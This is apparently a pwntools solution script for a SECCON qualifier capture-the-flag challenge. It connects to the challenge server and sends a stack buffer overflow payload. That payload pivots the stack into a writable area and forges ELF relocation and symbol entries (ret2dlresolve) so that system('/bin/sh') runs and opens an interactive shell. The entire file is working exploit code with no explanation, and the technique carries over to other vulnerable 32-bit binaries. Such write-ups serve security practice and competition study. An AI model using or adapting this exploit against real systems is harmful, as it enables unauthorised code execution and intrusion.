from pwn import *

# p = process('./chall')
p = remote('hiyoko.quals.seccon.jp', 9001)
# p = remote('localhost', 7777)
e = ELF('./chall')

pop_ebp_ret = 0x080491ae
leave_ret = 0x080490e5

base = 0x804c020 + 0x600
rel_plt = 0x80482d8
dynsym = 0x804820c
dynstr = 0x804825c
plt = 0x8049030

reloc = base + 20
sym = reloc + 8
pad = 0x10 - ((sym - dynsym) & 0xf)
sym += pad 
symstr = sym + 16
arg = symstr + 7 

reloc_offset = reloc - rel_plt
r_info = ((sym - dynsym) << 4) & ~0xff | 0x7 
st_name = symstr - dynstr

# 1st (Stack pivot)
payload = b'A' * 0x88
payload += p32(e.plt['gets'])
payload += p32(pop_ebp_ret)
payload += p32(base)
payload += p32(pop_ebp_ret)
payload += p32(base)
payload += p32(leave_ret)

p.sendline(payload)

# 2nd 
payload = b'AAAA'
payload += p32(plt)
payload += p32(reloc_offset)
payload += b'AAAA'
payload += p32(arg)

# Elf32_Rel
payload += p32(e.got['gets'])   # r_offset
payload += p32(r_info)          # r_info

payload += b'A' * pad

# Elf32_Sym
payload += p32(st_name)         # st_name
payload += p32(0)               # st_value
payload += p32(0)               # st_size
payload += p32(0x12)            # st_info

payload += b'system\x00'
payload += b'/bin/sh\x00'

p.sendline(payload)

p.interactive()
